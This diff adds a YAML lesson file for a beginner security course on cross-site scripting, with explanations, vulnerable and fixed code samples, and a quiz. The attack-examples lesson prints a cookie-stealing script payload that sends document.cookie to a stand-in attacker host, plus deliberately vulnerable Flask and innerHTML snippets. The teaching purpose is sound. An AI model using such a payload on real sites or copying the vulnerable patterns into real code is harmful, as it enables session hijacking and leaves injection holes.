@@ -1,0 +1,178 @@
+id: owasp_07_xss
+title: "OWASP #7: Cross-Site Scripting (XSS)"
+description: "Master XSS vulnerabilities and learn how to prevent script injection"
+difficulty: beginner
+estimated_time: "25 minutes"
+tags:
+  - owasp
+  - xss
+  - javascript
+  - injection
+
+lessons:
+  - title: "What is XSS?"
+    content:
+      - type: text
+        value: |
+          Cross-Site Scripting (XSS) occurs when an application includes untrusted data in a web page
+          without proper validation or escaping, allowing attackers to inject malicious scripts.
+
+      - type: text
+        value: |
+          Types of XSS:
+          • Stored (Persistent) XSS - Saved in database, affects all users
+          • Reflected XSS - Reflected from request to response
+          • DOM-based XSS - Client-side JavaScript manipulation
+
+      - type: warning
+        value: "XSS can steal cookies, hijack sessions, deface websites, and spread malware"
+
+    takeaways:
+      - "XSS allows attackers to run JavaScript in victims' browsers"
+      - "Three types: Stored, Reflected, DOM-based"
+      - "Can lead to complete account compromise"
+
+  - title: "XSS Attack Examples"
+    content:
+      - type: text
+        value: |
+          Stored XSS example (comment system):
+
+      - type: code
+        language: python
+        value: |
+          # VULNERABLE - No output escaping
+          comment = request.form['comment']
+          db.save_comment(comment)
+
+          # Later, when displaying comments:
+          return f"<div>{comment}</div>"  # ❌ XSS!
+
+      - type: text
+        value: |
+          Attacker submits comment:
+          <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
+
+      - type: text
+        value: |
+          Reflected XSS example (search page):
+
+      - type: code
+        language: python
+        value: |
+          # VULNERABLE
+          search_term = request.args.get('q')
+          return f"<h1>Results for: {search_term}</h1>"  # ❌ XSS!
+
+      - type: text
+        value: |
+          Attacker crafts malicious URL:
+          https://example.com/search?q=<script>alert('XSS')</script>
+
+      - type: code
+        language: javascript
+        value: |
+          // VULNERABLE - DOM XSS
+          const name = window.location.hash.substring(1);
+          document.getElementById('welcome').innerHTML = 'Welcome ' + name; // ❌ XSS!
+
+    takeaways:
+      - "Never trust user input"
+      - "XSS occurs when untrusted data reaches the DOM"
+      - "Can be in URLs, forms, cookies, or any user input"
+
+  - title: "Preventing XSS"
+    content:
+      - type: tip
+        value: "Always escape output based on context"
+
+      - type: code
+        language: python
+        value: |
+          # SECURE - Use template escaping
+          from flask import render_template_string
+
+          # Jinja2 auto-escapes by default
+          return render_template_string(
+              "<h1>Results for: {{ search_term }}</h1>",
+              search_term=search_term
+          )  # ✅ Safe!
+
+      - type: code
+        language: javascript
+        value: |
+          // SECURE - Use textContent instead of innerHTML
+          const name = window.location.hash.substring(1);
+          document.getElementById('welcome').textContent = 'Welcome ' + name; // ✅ Safe!
+
+      - type: tip
+        value: "Use Content Security Policy (CSP)"
+
+      - type: code
+        language: python
+        value: |
+          # Add CSP header
+          response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
+
+      - type: text
+        value: |
+          XSS prevention checklist:
+          ✅ Escape output based on context (HTML, JS, URL, CSS)
+          ✅ Use framework's built-in escaping (Jinja2, React)
+          ✅ Sanitize input (whitelist, not blacklist)
+          ✅ Use Content Security Policy (CSP)
+          ✅ Set HttpOnly flag on cookies
+          ✅ Use textContent instead of innerHTML
+          ✅ Validate input format
+          ✅ Encode URLs properly
+
+    takeaways:
+      - "Escape output, not just input"
+      - "Use framework-provided escaping"
+      - "CSP provides defense in depth"
+
+quiz:
+  - question: "What does XSS allow an attacker to do?"
+    options:
+      - "Access the database directly"
+      - "Execute JavaScript in victims' browsers"
+      - "Brute force passwords"
+      - "Perform SQL injection"
+    correct_answer: "Execute JavaScript in victims' browsers"
+    explanation: "XSS allows attackers to inject and execute malicious JavaScript code in the context of the victim's browser."
+
+  - question: "Which type of XSS is stored in the database?"
+    options:
+      - "Reflected XSS"
+      - "DOM-based XSS"
+      - "Stored XSS"
+      - "Blind XSS"
+    correct_answer: "Stored XSS"
+    explanation: "Stored (persistent) XSS is saved in the database and affects all users who view the infected content."
+
+  - question: "What is the safest way to insert user content into HTML?"
+    options:
+      - "innerHTML"
+      - "eval()"
+      - "textContent"
+      - "document.write()"
+    correct_answer: "textContent"
+    explanation: "textContent treats content as plain text, not HTML, preventing XSS. innerHTML can execute scripts."
+
+  - question: "What does CSP stand for?"
+    options:
+      - "Content Security Protocol"
+      - "Cross-Site Protection"
+      - "Content Security Policy"
+      - "Cookie Security Policy"
+    correct_answer: "Content Security Policy"
+    explanation: "Content Security Policy is a security header that controls which resources can be loaded and executed."
+
+  - question: "Why should cookies have the HttpOnly flag?"
+    options:
+      - "To work over HTTP"
+      - "To prevent JavaScript access"
+      - "To enable cross-domain cookies"
+      - "To compress cookie data"
+    correct_answer: "To prevent JavaScript access"
+    explanation: "HttpOnly prevents JavaScript from accessing cookies, protecting session tokens from XSS-based theft."
